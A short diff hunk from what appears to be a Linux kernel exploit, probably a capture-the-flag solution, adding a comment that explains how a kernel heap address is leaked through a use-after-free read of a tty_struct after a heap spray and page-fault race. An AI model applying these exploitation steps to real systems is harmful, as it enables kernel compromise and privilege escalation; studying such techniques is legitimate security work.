@@ -232,6 +232,10 @@ int main() {
   for (int i = 0; i < 0x10; i++) close(ptmx[i]);
 
   /* [2-1] UAF Read: tty_struct leak (heap) */
+
+  // kheap is leaked by means of a tty_struct. The exploit uses a new UAF +
+  // spray to get it, although it could as well have used the tty_struct used
+  // to leak kbase.
   victim = add(buf, 0x400);
   get(victim, page+0x1000, 0x400); // second page fault
   unsigned long kheap = *(unsigned long*)(page + 0x1038) - 0x38;
